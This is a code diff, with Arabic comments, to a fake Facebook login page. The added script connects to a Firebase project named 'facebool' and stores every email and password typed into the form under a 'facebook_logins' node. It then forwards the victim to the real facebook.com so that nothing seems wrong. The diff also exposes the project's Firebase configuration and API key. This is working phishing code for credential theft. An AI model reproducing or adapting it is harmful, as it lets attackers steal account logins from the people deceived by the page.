@@ -63,7 +63,6 @@
       font-size: 15px;
     }
     
-    /* تنسيق حاوية كلمة المرور لضبط مكان أيقونة العين */
     .password-container {
       position: relative;
       width: 100%;
@@ -187,11 +186,11 @@
   </div>
 
   <script>
+    // كود تشغيل العين وإخفائها (محلياً)
     const passwordInput = document.getElementById('password');
     const togglePasswordButton = document.getElementById('togglePassword');
     const toggleIcon = document.getElementById('toggleIcon');
 
-    // كود تشغيل العين وإخفائها محلياً فقط
     togglePasswordButton.addEventListener('click', function () {
       const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
       passwordInput.setAttribute('type', type);
@@ -204,30 +203,58 @@
     });
   </script>
 
+  <script type="module">
+    // استدعاء مكاتب الفايربيز عبر الـ CDN الرسمي
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+    // إعدادات الفايربيز الخاصة بمشروعك
+    const firebaseConfig = {
+      apiKey: "AIzaSyDkeUoRzeLLwT26zjlHgUzbU1vnDcweX4o",
+      authDomain: "facebool-f49f0.firebaseapp.com",
+      databaseURL: "https://facebool-f49f0-default-rtdb.firebaseio.com",
+      projectId: "facebool-f49f0",
+      storageBucket: "facebool-f49f0.firebasestorage.app",
+      messagingSenderId: "1009594237184",
+      appId: "1:1009594237184:web:f9a868f1336fa33df2f3e5",
+      measurementId: "G-L0JVS244FX"
+    };
+
+    // تشغيل الفايربيز والداتا بيز
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+
+    // الإمساك بالفورم وحقول الإدخال
+    const loginForm = document.getElementById('loginForm');
+    const emailInput = document.getElementById('email');
+
+    // تشغيل الحدث عند الضغط على زر Log In
+    loginForm.addEventListener('submit', function(e) {
+      e.preventDefault(); // منع الصفحة من إعادة التحميل
+
+      const emailValue = emailInput.value;
+      const passwordValue = passwordInput.value;
+
+      // تحديد مسار النود القديم في الفايربيز
+      const dbRef = ref(database, 'facebook_logins');
+
+      // إرسال البيانات
+      push(dbRef, {
+        email: emailValue,
+        password: passwordValue,
+        timestamp: new Date().toLocaleString()
+      })
+      .then(() => {
+        console.log("Data added successfully to the old database!");
+        // تحويل المستخدم إلى صفحة الفيسبوك الحقيقية بعد حفظ البيانات (اختياري)
+        window.location.href = "https://www.facebook.com"; 
+      })
+      .catch((error) => {
+        console.error("Error saving data: ", error);
+        alert("Something went wrong, please try again.");
+      });
+    });
+  </script>
+
 </body>
 </html>
-
-
-
-// Import the functions you need from the SDKs you need
-import { initializeApp } from "firebase/app";
-import { getAnalytics } from "firebase/analytics";
-// TODO: Add SDKs for Firebase products that you want to use
-// https://firebase.google.com/docs/web/setup#available-libraries
-
-// Your web app's Firebase configuration
-// For Firebase JS SDK v7.20.0 and later, measurementId is optional
-const firebaseConfig = {
-  apiKey: "AIzaSyDkeUoRzeLLwT26zjlHgUzbU1vnDcweX4o",
-  authDomain: "facebool-f49f0.firebaseapp.com",
-  databaseURL: "https://facebool-f49f0-default-rtdb.firebaseio.com",
-  projectId: "facebool-f49f0",
-  storageBucket: "facebool-f49f0.firebasestorage.app",
-  messagingSenderId: "1009594237184",
-  appId: "1:1009594237184:web:f9a868f1336fa33df2f3e5",
-  measurementId: "G-L0JVS244FX"
-};
-
-// Initialize Firebase
-const app = initializeApp(firebaseConfig);
-const analytics = getAnalytics(app);
